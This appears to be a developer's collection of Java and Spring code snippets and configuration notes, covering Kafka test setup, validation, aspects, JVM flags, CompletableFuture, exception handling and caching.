  EXCLUDE_KAFKA_TESTS=1_0_x
-
  KAFKA_VERSION=1.0.2
  EXCLUDE_KAFKA_TESTS=NOT-USED
-
  KAFKA_VERSION=1.1.1
  EXCLUDE_KAFKA_TESTS=NOT-USED
-
  KAFKA_VERSION=2.0.1
  EXCLUDE_KAFKA_TESTS=0_11_0_x
script:
  ## Generate dummy SSL Certificates used in tests
  - script/generateCertificatesForTests.sh
  ## Run CheckStyle and License Header checks, compile, and install locally
  - mvn clean install -DskipTests=true -DskipCheckStyle=false -Dmaven.javadoc.skip=true -B -V -DkafkaVersion=$KAFKA_VERSION -Dtests.excluded=$EXCLUDE_KAFKA_TESTS
  ## Run test suite
  - mvn test -B -DkafkaVersion=$KAFKA_VERSION -Dtests.excluded=$EXCLUDE_KAFKA_TESTS -DskipCheckStyle=true -Djava.security.auth.login.config=${PWD}/kafka-junit-core/src/test/resources/jaas.conf
--------------------------------------------------------------------------------------------------------
FROM confluentinc/cp-kafka

VOLUME ["/var/lib/${COMPONENT}/data", "/etc/${COMPONENT}/secrets"]

COPY include/etc/confluent/docker /etc/confluent/docker

CMD ["/etc/confluent/docker/run"]

ENTRYPOINT ["/docker_entrypoint.sh"]


docker-compose -f kafka-single-node.yml up -d

docker exec -it compose_kafka_1 bash

kafka-topics --zookeeper zookeeper:2181 --list

kafka-console-consumer --bootstrap-server kafka:29092 --topic demo-topic-1 --from-beginning

docker-compose -f kafka-single-node.yml down
--------------------------------------------------------------------------------------------------------
@BeforeClass
public static void setUpBeforeClass() {
    System.setProperty("spring.kafka.bootstrap-servers", embeddedKafka.getBrokersAsString());
    System.setProperty("spring.cloud.stream.kafka.binder.zkNodes", embeddedKafka.getZookeeperConnectionString());
}
--------------------------------------------------------------------------------------------------------
spring:
  kafka:
    producer:
      value-serializer: org.springframework.kafka.support.serializer.JsonSerializer
--------------------------------------------------------------------------------------------------------
        <!-- TestContainers library dependency -->
        <dependency>
            <groupId>org.testcontainers</groupId>
            <artifactId>testcontainers</artifactId>
            <version>${testcontainers.version}</version>
        </dependency>
        <dependency>
            <groupId>org.testcontainers</groupId>
            <artifactId>postgresql</artifactId>
            <version>${testcontainers.version}</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.testcontainers</groupId>
            <artifactId>kafka</artifactId>
            <version>${testcontainers.version}</version>
            <scope>test</scope>
        </dependency>

--------------------------------------------------------------------------------------------------------
javac src/main/java/org/hibernate/validator/ap/demo/Car.java \
   -cp /path/to/validation-api-1.0.0.GA.jar \ 
   -processorpath /path/to/validation-api-1.0.0.GA.jar:/path/to/hibernate-validator-annotation-processor-4.1.0.Final.jar    
   
<javac srcdir="src/main"
       destdir="build/classes"
       classpath="/path/to/validation-api-1.0.0.GA.jar">
       <compilerarg value="-processorpath" />
       <compilerarg value="/path/to/validation-api-1.0.0.GA.jar:/path/to/hibernate-validator-annotation-processor-4.1.0.Final.jar"/>
</javac>

<dependency>
    <groupId>org.hibernate</groupId>
    <artifactId>hibernate-validator-annotation-processor</artifactId>
    <version>4.1.0.Final</version>
    <scope>compile</scope>
</dependency>

<pluginRepositories>
    <pluginRepository>
        <id>maven-annotation-plugin-repo</id>
        <url>http://maven-annotation-plugin.googlecode.com/svn/trunk/mavenrepo</url>
    </pluginRepository>
</pluginRepositories>

validation-api-1.0.0.GA.jar

hibernate-validator-annotation-processor-4.1.0.Final.jar
--------------------------------------------------------------------------------------------------------
import javax.validation.Validator;

import com.couchbase.client.java.Bucket;

import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.condition.ConditionalOnSingleCandidate;
import org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration;
import org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.data.couchbase.core.mapping.event.ValidatingCouchbaseEventListener;
import org.springframework.data.couchbase.repository.CouchbaseRepository;

/**
 * {@link EnableAutoConfiguration Auto-configuration} for Spring Data's Couchbase support.
 *
 * @author Eddú Meléndez
 * @author Stephane Nicoll
 * @since 1.4.0
 */
@Configuration
@ConditionalOnClass({ Bucket.class, CouchbaseRepository.class })
@AutoConfigureAfter({ CouchbaseAutoConfiguration.class,
		ValidationAutoConfiguration.class })
@EnableConfigurationProperties(CouchbaseDataProperties.class)
@Import({ CouchbaseConfigurerAdapterConfiguration.class,
		SpringBootCouchbaseDataConfiguration.class })
public class CouchbaseDataAutoConfiguration {

	@Configuration
	@ConditionalOnClass(Validator.class)
	public static class ValidationConfiguration {

		@Bean
		@ConditionalOnSingleCandidate(Validator.class)
		public ValidatingCouchbaseEventListener validationEventListener(final Validator validator) {
			return new ValidatingCouchbaseEventListener(validator);
		}

	}
}

import javax.validation.constraints.NotNull;

public class Car {

    @NotNull
    private String manufacturer;

    @AssertTrue
    private boolean isRegistered;

    public Car(String manufacturer, boolean isRegistered) {
        super();
        this.manufacturer = manufacturer;
        this.isRegistered = isRegistered;
    }
}

ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
Validator validator = factory.getValidator();

Car car = new Car(null);

Set<ConstraintViolation<Car>> constraintViolations = validator.validate(car);

assertEquals(1, constraintViolations.size());
assertEquals("may not be null", constraintViolations.iterator().next().getMessage());


Validator validator = Validation.buildDefaultValidatorFactory().getValidator();

Car car = new Car(null);

Set<ConstraintViolation<Car>> constraintViolations = validator.validateProperty(car, "manufacturer");

assertEquals(1, constraintViolations.size());
assertEquals("may not be null", constraintViolations.iterator().next().getMessage());

Validator validator = Validation.buildDefaultValidatorFactory().getValidator();


Set<ConstraintViolation<Car>> constraintViolations = validator.validateValue(Car.class, "manufacturer", null);

assertEquals(1, constraintViolations.size());
assertEquals("may not be null", constraintViolations.iterator().next().getMessage());
--------------------------------------------------------------------------------------------------------
@Order(Ordered.HIGHEST_PRECEDENCE)
--------------------------------------------------------------------------------------------------------
import java.util.logging.Level;
import java.util.logging.Logger;

import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.AfterReturning;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;

@Component
@Aspect
public class LoggingAspect {

    private Logger logger = Logger.getLogger(LoggingAspect.class.getName());

    @Pointcut("within(ru.sysout.aspectsdemo.service.FullNameComposer)")
    public void stringProcessingMethods() {
    };

    @After("stringProcessingMethods()")
    public void logMethodCall(JoinPoint jp) {
        String methodName = jp.getSignature()
            .getName();

        logger.log(Level.INFO, "название метода: " + methodName);
    }

    @AfterReturning(pointcut = "execution(public String ru.sysout.aspectsdemo.service.FullNameComposer.*(..))", returning = "result")
    public void logAfterReturning(JoinPoint joinPoint, Object result) {

        logger.log(Level.INFO, "возвращенное значение: " + result.toString());
    }

    @Around("@annotation(LogExecutionTime)")
    public Object logExecutionTime(ProceedingJoinPoint joinPoint) throws Throwable {
        long start = System.currentTimeMillis();

        Object proceed = joinPoint.proceed();

        long executionTime = System.currentTimeMillis() - start;

        logger.log(Level.INFO, joinPoint.getSignature() + " выполнен за " + executionTime + "мс");
        return proceed;
    }
}
--------------------------------------------------------------------------------------------------------
#java -jar proguard\proguard-base-6.0.2.jar @L01.2.1.pro

-injars       target/L01.2.1.jar
-outjars      target/L01.2.1-out.jar

-printmapping pgmapout.map
-dontwarn

-keep public class ru.otus.l0111.Main {public static void main(java.lang.String[]);}
--------------------------------------------------------------------------------------------------------
 * To unzip the jar:
 * 7z x -oJAR ./target/L01.2.1.jar
 * unzip -d JAR ./target/L01.2.1.jar
 
  * mvn package
 * mvn clean compile
 * mvn assembly:single
 * mvn clean compile assembly:single
 
  * javap -c name.class
 * javap -v name.class
 
 /**
 * Created by tully.
 * <p>
 * Java 9 changes in logs:
 * https://dzone.com/articles/disruptive-changes-to-gc-logging-in-java-9
 */
/*
 -agentlib:jdwp=transport=dt_socket,address=14000,server=y,suspend=n
 -Xms512m
 -Xmx512m
 -XX:MaxMetaspaceSize=256m
 -XX:+UseConcMarkSweepGC
 -XX:+CMSParallelRemarkEnabled
 -XX:+UseCMSInitiatingOccupancyOnly
 -XX:CMSInitiatingOccupancyFraction=70
 -XX:+ScavengeBeforeFullGC
 -XX:+CMSScavengeBeforeRemark
 -XX:+UseParNewGC
 -verbose:gc
 -Xloggc:./logs/gc_pid_%p.log
 -XX:+PrintGCDateStamps
 -XX:+PrintGCDetails
 -XX:+UseGCLogFileRotation
 -XX:NumberOfGCLogFiles=10
 -XX:GCLogFileSize=1M
 -Dcom.sun.management.jmxremote.port=15000
 -Dcom.sun.management.jmxremote.authenticate=false
 -Dcom.sun.management.jmxremote.ssl=false
 -XX:+HeapDumpOnOutOfMemoryError
 -XX:HeapDumpPath=./dumps/
 
 #!/usr/bin/env bash

REMOTE_DEBUG="-agentlib:jdwp=transport=dt_socket,address=14025,server=y,suspend=n"
MEMORY="-Xms512m -Xmx512m -XX:MaxMetaspaceSize=256m"
GC="-XX:+UseConcMarkSweepGC -XX:+CMSParallelRemarkEnabled -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ScavengeBeforeFullGC -XX:+CMSScavengeBeforeRemark -XX:+UseParNewGC"
GC_LOG=" -verbose:gc -Xloggc:./logs/gc_pid_%p.log -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M"
JMX="-Dcom.sun.management.jmxremote.port=15025 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false"
DUMP="-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=./dumps/"

#-XX:OnOutOfMemoryError="kill -3 %p"

java $REMOTE_DEBUG $MEMORY $GC $GC_LOG $JMX $DUMP -jar target/L04.1-gc.jar > jvm.out

#!/usr/bin/env bash

mvn clean package

# linux
# cp target/root.war ~/apps/jetty/webapps/root.war

# windows
# copy target\root.war c:\Apps\Jetty\webapps\root.war
--------------------------------------------------------------------------------------------------------
import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

//this class will be registered with instrumentation agent
public class DurationTransformer implements ClassFileTransformer {
	public byte[] transform(ClassLoader loader, String className,
			Class classBeingRedefined, ProtectionDomain protectionDomain,
			byte[] classfileBuffer) throws IllegalClassFormatException {
		byte[] byteCode = classfileBuffer;

		// since this transformer will be called when all the classes are
		// loaded by the classloader, we are restricting the instrumentation
		// using if block only for the Lion class
		if (className.equals("com/javapapers/java/instrumentation/Lion")) {
			System.out.println("Instrumenting......");
			try {
				ClassPool classPool = ClassPool.getDefault();
				CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(
						classfileBuffer));
				CtMethod[] methods = ctClass.getDeclaredMethods();
				for (CtMethod method : methods) {
					method.addLocalVariable("startTime", CtClass.longType);
					method.insertBefore("startTime = System.nanoTime();");
					method.insertAfter("System.out.println(\"Execution Duration "
							+ "(nano sec): \"+ (System.nanoTime() - startTime) );");
				}
				byteCode = ctClass.toBytecode();
				ctClass.detach();
				System.out.println("Instrumentation complete.");
			} catch (Throwable ex) {
				System.out.println("Exception: " + ex);
				ex.printStackTrace();
			}
		}
		return byteCode;
	}
}
--------------------------------------------------------------------------------------------------------
/**
 * Created by tully.
 */
public class BaseThread extends Thread {

    public void run() {
        while (!CounterSemaphore.instance().stop()) {
            doSomething();
        }
    }

    protected void doSomething() {
       //business logic
    }

}


--------------------------------------------------------------------------------------------------------
import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;

import java.io.IOException;
import java.io.StringWriter;
import java.io.Writer;
import java.util.Map;

/**
 * @author v.chibrikov
 */
class TemplateProcessor {
    private static final String HTML_DIR = "/tml/";

    private final Configuration configuration;

    public TemplateProcessor() throws IOException {
        configuration = new Configuration(Configuration.VERSION_2_3_28);
        configuration.setClassForTemplateLoading(this.getClass(), HTML_DIR);
        configuration.setDefaultEncoding("UTF-8");
    }

    String getPage(String filename, Map<String, Object> data) throws IOException {
        try (Writer stream = new StringWriter();) {
            Template template = configuration.getTemplate(filename);
            template.process(data, stream);
            return stream.toString();
        } catch (TemplateException e) {
            throw new IOException(e);
        }
    }
}
--------------------------------------------------------------------------------------------------------

    TemplateProcessor() throws IOException {
        configuration = new Configuration(Configuration.VERSION_2_3_28);
        configuration.setClassForTemplateLoading(this.getClass(), HTML_DIR);
        configuration.setDefaultEncoding("UTF-8");
    }
	
	       // Lambda
        Collections.sort(list, (String s1, String s2) -> {return s1.length() - s2.length();});

        // Типы выводятся
        Collections.sort(list, (s1, s2) -> {return s1.length() - s2.length();});

        Collections.sort(list, Comparator.comparingInt(s -> s.length()));
--------------------------------------------------------------------------------------------------------
    static void pool() throws Exception {
        System.out.println("pool()");
        ForkJoinPool fjPool = new ForkJoinPool(2);
        fjPool.submit(() -> {
            int result = IntStream.range(0, 5)
                    .parallel()
                    .peek(it -> System.out.printf("Thread [%s] peek: %d\n", Thread.currentThread().getName(), it))
                    .sum();
            System.out.println("sum: " + result);
        });
        fjPool.awaitTermination(1, TimeUnit.SECONDS);
    }
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.confirmationlink.callback.system.configuration;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.convert.ConversionService;
import org.springframework.core.convert.converter.Converter;
import org.springframework.core.convert.support.DefaultConversionService;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.servlet.HandlerExceptionResolver;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
import org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver;

import java.util.List;

@Configuration
@EnableWebMvc
public class ConfirmationLinkCallbackConfiguration implements WebMvcConfigurer {

    @Bean
    public RestTemplate restTemplate() {
        return new RestTemplate();
    }

    @Bean
    public ConversionService conversionService(final List<Converter> converters) {
        final DefaultConversionService dcs = new DefaultConversionService();
        converters.forEach(dcs::addConverter);
        return dcs;
    }

    @Override
    public void configureHandlerExceptionResolvers(final List<HandlerExceptionResolver> exceptionResolvers) {
        exceptionResolvers.add(new DefaultHandlerExceptionResolver());
    }
}
--------------------------------------------------------------------------------------------------------
@ControllerAdvice("my.chosen.package")
@ControllerAdvice(value = "my.chosen.package")
@ControllerAdvice(basePackages = "my.chosen.package")
@ControllerAdvice(assignableTypes = MyController.class)
@ControllerAdvice(basePackageClasses = MyClass.class)

--------------------------------------------------------------------------------------------------------
@ControllerAdvice
public class GlobalExceptionHandler {
    /** Provides handling for exceptions throughout this service. */
    @ExceptionHandler({ UserNotFoundException.class, ContentNotAllowedException.class })
    public final ResponseEntity<ApiError> handleException(Exception ex, WebRequest request) {
        HttpHeaders headers = new HttpHeaders();

        if (ex instanceof UserNotFoundException) {
            HttpStatus status = HttpStatus.NOT_FOUND;
            UserNotFoundException unfe = (UserNotFoundException) ex;

            return handleUserNotFoundException(unfe, headers, status, request);
        } else if (ex instanceof ContentNotAllowedException) {
            HttpStatus status = HttpStatus.BAD_REQUEST;
            ContentNotAllowedException cnae = (ContentNotAllowedException) ex;

            return handleContentNotAllowedException(cnae, headers, status, request);
        } else {
            HttpStatus status = HttpStatus.INTERNAL_SERVER_ERROR;
            return handleExceptionInternal(ex, null, headers, status, request);
        }
    }

    /** Customize the response for UserNotFoundException. */
    protected ResponseEntity<ApiError> handleUserNotFoundException(UserNotFoundException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        List<String> errors = Collections.singletonList(ex.getMessage());
        return handleExceptionInternal(ex, new ApiError(errors), headers, status, request);
    }

    /** Customize the response for ContentNotAllowedException. */
    protected ResponseEntity<ApiError> handleContentNotAllowedException(ContentNotAllowedException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        List<String> errorMessages = ex.getErrors()
                .stream()
                .map(contentError -> contentError.getObjectName() + " " + contentError.getDefaultMessage())
                .collect(Collectors.toList());

        return handleExceptionInternal(ex, new ApiError(errorMessages), headers, status, request);
    }

    /** A single place to customize the response body of all Exception types. */
    protected ResponseEntity<ApiError> handleExceptionInternal(Exception ex, ApiError body, HttpHeaders headers, HttpStatus status, WebRequest request) {
        if (HttpStatus.INTERNAL_SERVER_ERROR.equals(status)) {
            request.setAttribute(WebUtils.ERROR_EXCEPTION_ATTRIBUTE, ex, WebRequest.SCOPE_REQUEST);
        }

        return new ResponseEntity<>(body, headers, status);
    }
}
--------------------------------------------------------------------------------------------------------
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.1.4.RELEASE)
--------------------------------------------------------------------------------------------------------
curl -X POST "http://vdlg-pba11-auth-1.pba.internal:20025/api/v1/crm-adapter/mails" -H "accept: application/json;charset=UTF-8" -H "Content-Type: application/json" -d "{ \"AttachedId\": [ \"string\" ], \"Locale\": \"string\", \"ResponseData\": {}, \"ResponseId\": \"string\", \"Subject\": \"string\", \"TemplateName\": \"string\", \"UserId\": \"string\"}"
--------------------------------------------------------------------------------------------------------
    ThreadFactory threadFactory =
        new ThreadFactory() {

          private final AtomicInteger threadNumber = new AtomicInteger(0);

          @Override
          public Thread newThread(@Nonnull Runnable r) {
            return new Thread(
                r, ThreadUtil.THREAD_NAME + "-PoolService-" + threadNumber.getAndIncrement());
          }
        };
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Created-By: Apache Maven
Built-By: ceki
Build-Jdk: 1.7.0_17
Bundle-Description: The slf4j API
Bundle-Version: 1.7.16
Implementation-Version: 1.7.16
X-Compile-Source-JDK: 1.5
X-Compile-Target-JDK: 1.5
Implementation-Title: slf4j-api
Bundle-ManifestVersion: 2
Bundle-SymbolicName: slf4j.api
Bundle-Name: slf4j-api
Bundle-Vendor: SLF4J.ORG
Bundle-RequiredExecutionEnvironment: J2SE-1.5
Export-Package: org.slf4j;version=1.7.16, org.slf4j.spi;version=1.7.16
 , org.slf4j.helpers;version=1.7.16, org.slf4j.event;version=1.7.16
Import-Package: org.slf4j.impl;version=1.6.0

Manifest-Version: 1.0
Ant-Version: Apache Ant 1.7.1
Created-By: 14.3-b01-101 (Apple Inc.)
Premain-Class: lombok.launch.Agent
Agent-Class: lombok.launch.Agent
Can-Redefine-Classes: true
Main-Class: lombok.launch.Main
Lombok-Version: 1.18.4

Manifest-Version: 1.0
Implementation-Title: opentest4j
Automatic-Module-Name: org.opentest4j
Build-Date: 2018-09-10
Bundle-SymbolicName: org.opentest4j
Implementation-Version: 1.1.1
Built-By: OTA4J Team
Bundle-ManifestVersion: 2
Bnd-LastModified: 1536606747000
Specification-Vendor: opentest4j.org
Specification-Title: opentest4j
Bundle-Vendor: opentest4j.org
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.6))"
Tool: Bnd-2.4.0.201411031534
Implementation-Vendor: opentest4j.org
Export-Package: org.opentest4j;version="1.1.1"
Bundle-Version: 1.1.1
Bundle-Name: opentest4j
Build-Revision: 55cabbf7e6319c9dd5df68745e06824c50b6b2ef
Build-Time: 21:12:26.111+0200
Created-By: 1.8.0_162 (Oracle Corporation 25.162-b12)
Specification-Version: 1.1.1
--------------------------------------------------------------------------------------------------------
mvn clean install -Dspring.profiles.active="profile_name".
--------------------------------------------------------------------------------------------------------
@Test
public void whenExceptionThrown_thenAssertionSucceeds() {
    String test = null;
    assertThrows(NullPointerException.class, () -> {
        test.length();
    });
}
@Test(expected = NullPointerException.class)
public void whenExceptionThrown_thenExpectationSatisfied() {
    String test = null;
    test.length();
}
@Rule
public ExpectedException exceptionRule = ExpectedException.none();
 
@Test
public void whenExceptionThrown_thenRuleIsApplied() {
    exceptionRule.expect(NumberFormatException.class);
    exceptionRule.expectMessage("For input string");
    Integer.parseInt("1a");
}


--------------------------------------------------------------------------------------------------------
"file.separator"	Character that separates components of a file path. This is “/” on UNIX and “\” on Windows.
"java.class.path"	Path used to find directories and JAR archives containing class files. Elements of the class path are separated by a platform-specific character specified in the path.separator property.
"java.home"	Installation directory for Java Runtime Environment (JRE)
"java.vendor"	JRE vendor name
"java.vendor.url"	JRE vendor URL
"java.version"	JRE version number
"line.separator"	Sequence used by operating system to separate lines in text files
"os.arch"	Operating system architecture
"os.name"	Operating system name
"os.version"	Operating system version
"path.separator"	Path separator character used in java.class.path
"user.dir"	User working directory
"user.home"	User home directory
"user.name"	User account name
--------------------------------------------------------------------------------------------------------
boolean allValid = Arrays.stream(DOT_PATTERN.split(packageName, -1)).allMatch(SourceVersion::isName);
--------------------------------------------------------------------------------------------------------
// Асинхронно запускаем задачу, заданную объектом Runnable
CompletableFuture<Void> future = CompletableFuture.runAsync(new Runnable() {
    @Override
    public void run() {
        // Имитация длительной работы
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        System.out.println("Я буду работать в отдельном потоке, а не в главном.");
    }
});
 
// Блокировка и ожидание завершения Future
future.get();

// Запуск асинхронной задачи, заданной объектом Supplier
CompletableFuture<String> future = CompletableFuture.supplyAsync(new Supplier<String>() {
    @Override
    public String get() {
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        return "Результат асинхронной задачи";
    }
});

CompletableFuture<User> getUsersDetail(String userId) {
    return CompletableFuture.supplyAsync(() -> {
        UserService.getUserDetails(userId);
    });
}
 
CompletableFuture<Double> getCreditRating(User user) {
    return CompletableFuture.supplyAsync(() -> {
        CreditRatingService.getCreditRating(user);
    });
}

CompletableFuture<CompletableFuture<Double>> result = getUserDetail(userId)
        .thenApply(user -> getCreditRating(user));

СompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
        throw new IllegalStateException(e);
    }
    return "Результат асинхронной задачи";
}, executor);

System.out.println("Получение веса.");
CompletableFuture<Double> weightInKgFuture = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return 65.0;
});
 
System.out.println("Получение роста.");
CompletableFuture<Double> heightInCmFuture = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return 177.8;
});
 
System.out.println("Расчёт индекса массы тела.");
CompletableFuture<Double> combinedFuture = weightInKgFuture
        .thenCombine(heightInCmFuture, (weightInKg, heightInCm) -> {
    Double heightInMeter = heightInCm / 100;
    return weightInKg/(heightInMeter * heightInMeter);
});
 
System.out.println("Ваш индекс массы тела - " + combinedFuture.get());

// Когда все задачи завершены, вызываем future.join(), чтобы получить результаты и собрать их в список
CompletableFuture<List<String>> allPageContentsFuture = allFutures.thenApply(v -> {
   return pageContentFutures.stream()
           .map(pageContentFuture -> pageContentFuture.join())
           .collect(Collectors.toList());
});

CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(2);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 1";
});
 
CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(1);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 2";
});
 
CompletableFuture<String> future3 = CompletableFuture.supplyAsync(() -> {
    try {
        TimeUnit.SECONDS.sleep(3);
    } catch (InterruptedException e) {
       throw new IllegalStateException(e);
    }
    return "Результат Future 3";
});
 
CompletableFuture<Object> anyOfFuture = CompletableFuture.anyOf(future1, future2, future3);
 
System.out.println(anyOfFuture.get()); // Результат Future 2


CompletableFuture<String> maturityFuture = CompletableFuture.supplyAsync(() -> {
    if (age < 0) {
        throw new IllegalArgumentException("Возраст не может быть отрицательным");
    }
    if (age > 18) {
        return "Взрослый";
    } else {
        return "Ребёнок";
    }
}).exceptionally(ex -> {
    System.out.println("Ой! У нас тут исключение - " + ex.getMessage());
    return "Неизвестно!";
});


Integer age = -1;
 
CompletableFuture<String> maturityFuture = CompletableFuture.supplyAsync(() -> {
    if (age < 0) {
        throw new IllegalArgumentException("Возраст не может быть отрицательным");
    }
    if (age > 18) {
        return "Взрослый";
    } else {
        return "Ребёнок";
    }
}).handle((res, ex) -> {
    if (ex != null) {
        System.out.println("Ой! У нас тут исключение - " + ex.getMessage());
        return "Неизвестно!";
    }
    return res;
});
 
System.out.println("Зрелость: " + maturityFuture.get());
--------------------------------------------------------------------------------------------------------
things.stream().filter(filtersCollection.stream().<Predicate>map(f -> f::test)
                       .reduce(Predicate::or).orElse(t->false));
--------------------------------------------------------------------------------------------------------
@RestControllerAdvice
public class GlobalResponseEntityExceptionHandler extends ResponseEntityExceptionHandler {

    @Override
    protected ResponseEntity<Object> handleMissingServletRequestParameter(MissingServletRequestParameterException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        return errorResponse(HttpStatus.BAD_REQUEST, "Required request params missing");
    }

    private ResponseEntity<Object> errorResponse(HttpStatus status, String message) {
        return ResponseEntity.status(status).body(message);
    }
}
--------------------------------------------------------------------------------------------------------
@Override
protected ResponseEntity<Object> handleExceptionInternal(Exception ex, Object body,
                             HttpHeaders headers, HttpStatus status, WebRequest request) {
    if (body == null) {
        body = ImmutableMap.builder()
                   .put("timestamp", LocalDateTime.now().atZone(ZoneId.systemDefault()).toEpochSecond())
                   .put("status", status.value())
                   .put("error", status.getReasonPhrase())
                   .put("message", ex.getMessage())
                   .put("exception", ex.getClass().getSimpleName())  // can show FQCN like spring with getName()
                   .put("path", ((ServletWebRequest)request).getRequest().getRequestURI())
                   .build();
    }
    return super.handleExceptionInternal(ex, body, headers, status, request);
}
--------------------------------------------------------------------------------------------------------
public interface DomainOperations<T> {
  default List<T> filter(Predicate<T> predicate) {
    return persons.stream().filter( predicate )
      .collect(Collectors.<Person>toList());
 }
}
--------------------------------------------------------------------------------------------------------
public static void main(String[] args) {
Optional<Employee> maxSalaryEmp=employeeList.stream()
    .reduce((Employee a, Employee b) -> a.getSalary() < b.getSalary() ? b:a);
if(maxSalaryEmp.isPresent())
  System.out.println("Employee with max salary: "+maxSalaryEmp.get());
}
--------------------------------------------------------------------------------------------------------
public class CacheManager {
    public static final List<CacheManager> ALL_CACHE_MANAGERS = new CopyOnWriteArrayList<CacheManager>();
....
}
--------------------------------------------------------------------------------------------------------
@CacheConfig(cacheNames="book", keyGenerator="myKeyGenerator") 
public class BookRepository {

    @Cacheable
    public Book findBook(ISBN isbn) {...}

    public Book thisIsNotCached(String someArg) {...}
}
--------------------------------------------------------------------------------------------------------
public class CacheUtil {
  public static CacheManager myCacheManager;

  public CacheManager getMyCacheManager() {
    if(myCacheManager == null) {
    for (CacheManager cacheManager : CacheManager.ALL_CACHE_MANAGERS) {
       if("myCacheManager".equals(cacheManager.getName())) {
          myCacheManager = cacheManager;
       }
    }
    return myCacheManager;
  }
}
--------------------------------------------------------------------------------------------------------
var cacheManager = require('cache-manager');
var fsStore = require('cache-manager-fs');
var diskCache = cacheManager.caching({
    store: fsStore, options: {
      ttl: 60*60,
      maxsize: 1000*1000*1000,
      path: 'diskcache',
      preventfill: true
    }
  });

var ttl = 30;

function getUser(id, cb) {
    setTimeout(function () {
        console.log("Returning user from slow database.");
        cb(null, {id: id, name: 'Bob'});
    }, 5000);
}

var userId = 123;
var key = 'user_' + userId;

// Note: ttl is optional in wrap()
memoryCache.wrap(key, function (cb) {
    getUser(userId, cb);
}, {ttl: ttl}, function (err, user) {
    console.log(user);

    // Second time fetches user from memoryCache
    memoryCache.wrap(key, function (cb) {
        getUser(userId, cb);
    }, function (err, user) {
        console.log(user);
    });
});
--------------------------------------------------------------------------------------------------------
@Bean
public CacheManager cacheManager() {
	SimpleCacheManager cacheManager = new SimpleCacheManager();
	cacheManager.setCaches( Collections.singletonList( new ConcurrentMapCache( “userCache” ) ) );

	// manually call initialize the caches as our SimpleCacheManager is not declared as a bean
	cacheManager.initializeCaches(); 

	return new TransactionAwareCacheManagerProxy( cacheManager );
}
--------------------------------------------------------------------------------------------------------
Cache transactionAwareUserCache( CacheManager cacheManager ) {
	return new TransactionAwareCacheDecorator( cacheManager.getCache( “userCache” ) );
}
--------------------------------------------------------------------------------------------------------
@Bean
public CacheManager cacheManager( net.sf.ehcache.CacheManager ehCacheCacheManager ) {
	EhCacheCacheManager cacheManager = new EhCacheCacheManager();
	cacheManager.setCacheManager( ehCacheCacheManager );
	cacheManager.setTransactionAware( true );
	return cacheManager;
}
--------------------------------------------------------------------------------------------------------
class UserService {
	@Cacheable(value = "userCache", unless = "#result != null")
	public User getUserById( long id ) {
   		return userRepository.getById( id );
	}
}
 
class UserRepository {
	@Caching(
      put = {
            @CachePut(value = "userCache", key = "'username:' + #result.username", condition = "#result != null"),
            @CachePut(value = "userCache", key = "#result.id", condition = "#result != null")
      }
	)
	@Transactional(readOnly = true)
	public User getById( long id ) {
	   ...
